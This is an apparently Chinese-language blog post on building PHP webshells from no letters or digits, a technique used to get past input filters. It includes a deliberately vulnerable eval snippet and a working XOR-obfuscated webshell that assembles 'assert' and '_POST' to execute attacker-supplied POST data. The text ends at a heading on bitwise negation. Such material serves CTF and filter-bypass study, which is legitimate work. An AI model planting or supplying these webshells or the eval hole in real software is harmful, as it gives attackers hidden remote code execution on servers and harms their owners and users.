---
title: 'php一些webshell构造总结'
date: 2019-10-05
updated: 2019-10-10
category: 'php'
tags:
  - 'php'
  - 'webshell'
lang: 'zh'
draft: false
---
## ASCII表复习

由于构造shell的时候都需要使用到异或等运算，所以手边一定要常备ASCII码表

![img](/2019/10/05/php-yi-xie-webshell-gou-zao-zong-jie/ascii)

表格总共是16行8列 从0开始，到0x7f结束

记住常用的ASCII码值

```
0 十进制 48 十六进制 0x30
1 十进制 49 十六进制 0x31

A 十进制 65 十六进制 0x41  其实就是跨了16行正好在相邻的列上
a 十进制 97 十六进制 0x61  垮了两次16行
```

## 最基本的无字母数字webshell

```php
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
  eval($_GET['shell']);
}
```

参考[p牛的文章](https://www.leavesongs.com/penetration/webshell-without-alphanum.html)

### 通过异或

```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```

## 取反

核心也是构造出一个函数
